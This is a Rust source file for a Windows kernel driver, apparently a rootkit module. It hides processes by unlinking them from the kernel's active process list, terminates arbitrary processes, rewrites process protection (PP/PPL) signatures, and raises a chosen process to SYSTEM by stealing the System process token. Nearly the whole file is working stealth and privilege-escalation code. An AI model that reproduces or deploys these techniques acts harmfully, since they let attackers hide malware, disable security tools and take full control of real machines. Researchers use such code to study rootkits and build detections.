use {
    spin::{mutex::Mutex, lazy::Lazy},
    wdk_sys::{ntddk::*, *},
    alloc::{boxed::Box, vec::Vec}, 
    core::sync::atomic::{AtomicPtr, Ordering},
    shared::{
        vars::MAX_PID,
        enums::Options,
        structs::{
            HiddenProcessInfo , ProcessListInfo, TargetProcess, 
            ProcessInfoHide, ProcessSignature, LIST_ENTRY, 
            EnumerateInfoInput
        }, 
    }, 
    crate::{
        internals::structs::PROCESS_SIGNATURE,
        utils::{
            offsets::{
                get_offset_signature, get_offset_token, 
                get_offset_unique_process_id
            },
            with_push_lock_exclusive
        },
    }, 
};

#[cfg(not(feature = "mapper"))]
pub mod callback;
#[cfg(not(feature = "mapper"))]
pub use callback::*;
pub mod ioctls;

/// List of target processes protected by a mutex.
pub static PROCESS_INFO_HIDE: Lazy<Mutex<Vec<HiddenProcessInfo>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_PID))); 

/// Represents a process in the operating system.
pub struct Process {
    /// Pointer to the EPROCESS structure, used for managing process information.
    pub e_process: PEPROCESS,
}

impl Process {
    /// Creates a new `Process` instance by looking up a process by its PID.
    ///
    /// # Parameters
    /// 
    /// - `pid`: The process identifier (PID) to look up.
    ///
    /// # Returns
    /// 
    /// - `Option<Self>`: Returns `Some(Self)` if the process lookup is successful, otherwise `None`.
    ///
    #[inline]
    pub fn new(pid: usize) -> Option<Self> {
        let mut process = core::ptr::null_mut();

        let status = unsafe { PsLookupProcessByProcessId(pid as _, &mut process) };
        if NT_SUCCESS(status) {
            Some(Self { e_process: process })
        } else {
            log::error!("PsLookupProcessByProcessId Failed With Status: {status}");
            None
        }
    }

    /// Toggle the visibility of a process based on the `enable` field of the `TargetProcess` structure.
    ///
    /// # Parameters
    /// 
    /// - `process`:  A pointer to the `TargetProcess` structure.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn process_toggle(process: *mut ProcessInfoHide) -> NTSTATUS {
        let pid = (*process).pid;
        if (*process).enable {
            Self::hide_process(pid).map(|_| STATUS_SUCCESS).unwrap_or_else(|err_code| err_code)
        } else {
            Self::unhide_process(pid).map(|_| STATUS_SUCCESS).unwrap_or_else(|err_code| err_code)
        }
    }

    /// Hide a process by removing it from the list of active processes.
    ///
    /// # Parameters
    /// 
    /// - `process`: The identifier of the target process (PID) to be hidden.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    unsafe fn hide_process(pid: usize) -> Result<(), NTSTATUS> {
        // Offsets
        let unique_process_id = get_offset_unique_process_id();
        let active_process_link_list = unique_process_id + core::mem::size_of::<usize>() as isize;
        let process_lock = unique_process_id - core::mem::size_of::<usize>() as isize;

        // Retrieving EPROCESS from the target process
        let process = Self::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;

        let list_entry = process.e_process.cast::<u8>().offset(active_process_link_list) as PLIST_ENTRY;
        let push_lock = process.e_process.cast::<u8>().offset(process_lock) as *mut u64;

        with_push_lock_exclusive(push_lock, || {
            let next = (*list_entry).Flink; // Process (3)
            let previous = (*list_entry).Blink; // Process (1)
            let list = LIST_ENTRY {
                Flink: next as *mut LIST_ENTRY,
                Blink: previous as *mut LIST_ENTRY,
            };
    
            let mut process_info = PROCESS_INFO_HIDE.lock();
            let list_ptr = Box::into_raw(Box::new(list));
    
            process_info.push(HiddenProcessInfo  {
                pid,
                list_entry: AtomicPtr::new(list_ptr),
            });
    
            (*next).Blink = previous;
            (*previous).Flink = next;
    
            (*list_entry).Flink = list_entry;
            (*list_entry).Blink = list_entry;
                    
            log::info!("Process with PID {pid} hidden successfully.");
            Ok(())
        })
    }

    /// Unhide a process by removing it from the list of active processes.
    ///
    /// # Parameters
    /// 
    /// - `process`: The identifier of the target process (PID) to be hidden.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    unsafe fn unhide_process(pid: usize) -> Result<(), NTSTATUS> {
        // Offsets
        let unique_process_id = get_offset_unique_process_id();
        let active_process_link_list = unique_process_id + core::mem::size_of::<usize>() as isize;
        let process_lock = unique_process_id - core::mem::size_of::<usize>() as isize;

        // Retrieving EPROCESS from the target process
        let process = Self::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;

        let list_entry = process.e_process.cast::<u8>().offset(active_process_link_list) as PLIST_ENTRY;
        let push_lock = process.e_process.cast::<u8>().offset(process_lock) as PULONG_PTR;

        with_push_lock_exclusive(push_lock, || {
            // Restoring Flink / Blink
            let mut process_info = PROCESS_INFO_HIDE.lock();
            if let Some(index) = process_info.iter().position(|p| p.pid == pid) {
                let process = &process_info[index];
                let list = process.list_entry.load(Ordering::SeqCst);
                if list.is_null() {
                    log::error!("List entry stored in AtomicPtr is null");
                    return Err(STATUS_INVALID_PARAMETER);
                }

                (*list_entry).Flink = (*list).Flink as *mut _LIST_ENTRY;
                (*list_entry).Blink = (*list).Blink as *mut _LIST_ENTRY;

                let next = (*list_entry).Flink; // Processo (3)
                let previous = (*list_entry).Blink; // Processo (1)

                (*next).Blink = list_entry;
                (*previous).Flink = list_entry;

                process_info.remove(index);
                log::info!("Process with PID {pid} unhidden successfully.");

                Ok(())
            } else {
                log::info!("PID ({pid}) Not found");
                Err(STATUS_UNSUCCESSFUL)
            }
        })
    }

    /// Toggles the enumeration between hiding or protecting processes based on the options provided.
    ///
    /// # Parameters
    /// 
    /// - `input_target`: Pointer to the enumeration information input structure.
    /// - `info_process`: Information structure of processes.
    /// - `information`: Pointer to a variable to store information size.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: Status of the operation. `STATUS_SUCCESS` if successful, `STATUS_UNSUCCESSFUL` otherwise.
    /// 
    pub unsafe fn enumerate_process_toggle(input_target: *mut EnumerateInfoInput, info_process: *mut ProcessListInfo, information: &mut usize) -> NTSTATUS {
        match (*input_target).options {
            Options::Hide => {
                Self::enumerate_hide_processes(info_process, information)
            },
            #[cfg(not(feature = "mapper"))]
            Options::Protection => {
                callback::enumerate_protection_processes(info_process, information)
            },
            #[cfg(feature = "mapper")]
            Options::Protection => {
                wdk_sys::STATUS_INVALID_DEVICE_REQUEST;
            },
        }
    }

    /// Enumerate Processes Hide.
    ///
    /// # Parameters
    /// 
    /// - `info_process`: It is a parameter of type `ProcessListInfo` that will send the processes that are currently hidden.
    /// - `information`: It is a parameter of type `usize` that will be updated with the total size of the filled `ProcessListInfo` structures.
    /// 
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    unsafe fn enumerate_hide_processes(info_process: *mut ProcessListInfo, information: &mut usize) -> NTSTATUS {
        let process_info = PROCESS_INFO_HIDE.lock();
        let mut count = 0;
        for i in process_info.iter() {
            (*info_process.offset(count)).pids = i.pid;

            *information += core::mem::size_of::<ProcessListInfo>();
            count += 1;
        }

        STATUS_SUCCESS
    }

    /// Terminate a process specified by the PID (Process Identifier).
    ///
    /// # Parameters
    /// 
    /// - `pid`: The identifier of the target process (PID) to terminate process.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn terminate_process(process: *mut TargetProcess) -> NTSTATUS {
        let mut h_process: HANDLE = core::ptr::null_mut();
        let pid = (*process).pid;
        let mut object_attributes: OBJECT_ATTRIBUTES = core::mem::zeroed();
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: core::ptr::null_mut(),
        };

        let mut status = ZwOpenProcess(
            &mut h_process,
            PROCESS_ALL_ACCESS,
            &mut object_attributes,
            &mut client_id,
        );
        if !NT_SUCCESS(status) {
            log::error!("ZwOpenProcess Failed With Status: {status}");
            return status;
        }

        status = ZwTerminateProcess(h_process, 0);

        ZwClose(h_process);

        if !NT_SUCCESS(status) {
            log::error!("ZwTerminateProcess Failed With Status: {status}");
            return status;
        }

        log::info!("Process terminated with success: {pid}");

        STATUS_SUCCESS
    }

    /// Removing process signature (PP / PPL).
    ///
    /// # Parameters
    /// 
    /// - `pid`: The identifier of the target process (PID) to remove protection.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn protection_signature(signature_info: *mut ProcessSignature) -> Result<(), NTSTATUS> {
        let pid = (*signature_info).pid;
        let sg = (*signature_info).sg;
        let tp = (*signature_info).tp;

        // Offset
        let protection_offset = get_offset_signature();

        // Retrieving EPROCESS from the target process
        let process = Self::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;

        let new_sign = (sg << 4) | tp;
        let process_signature = process.e_process.cast::<u8>().offset(protection_offset) as *mut PROCESS_SIGNATURE;

        (*process_signature).signature_level = new_sign as u8;
        (*process_signature).protection.set_type_(tp as u8);
        (*process_signature).protection.set_signer(sg as u8);

        Ok(())
    }

    /// Raises the token of the specified process to the system token.
    ///
    /// This function raises the token of a process identified by its PID (Process ID)
    /// to the token of the system process, effectively elevating the privileges of the target process
    /// to those of the system (NT AUTHORITY\SYSTEM).
    ///
    /// # Parameters
    /// 
    /// - `pid`: The identifier of the target process (PID) whose token will be raised.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn elevate_process(process: *mut TargetProcess) -> Result<(), NTSTATUS> {
        let pid = (*process).pid;
        let system_process = 4;

        // Offset
        let token = get_offset_token();

        // Retrieving EPROCESS from the target process
        let target = Self::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;

        // Retrieving EPROCESS from the System process (By default the PID is 4)
        let system = Self::new(system_process).ok_or(STATUS_UNSUCCESSFUL)?;

        // Accessing EPROCESS.Token
        let target_token_ptr = target.e_process.cast::<u8>().offset(token) as *mut u64;
        let system_token_ptr = system.e_process.cast::<u8>().offset(token) as *mut u64;

        // Writing the system value to the target process
        target_token_ptr.write(system_token_ptr.read());

        log::info!("Elevate NT AUTHORITY\\SYSTEM for the process: {pid}");

        Ok(())
    }

}

/// Implements the `Drop` trait for the `Process` structure to handle cleanup when the structure goes out of scope.
impl Drop for Process {
    /// Cleans up the resources held by the `Process` structure.
    fn drop(&mut self) {
        if !self.e_process.is_null() {
            unsafe { ObfDereferenceObject(self.e_process as _) };
        }
    }
}
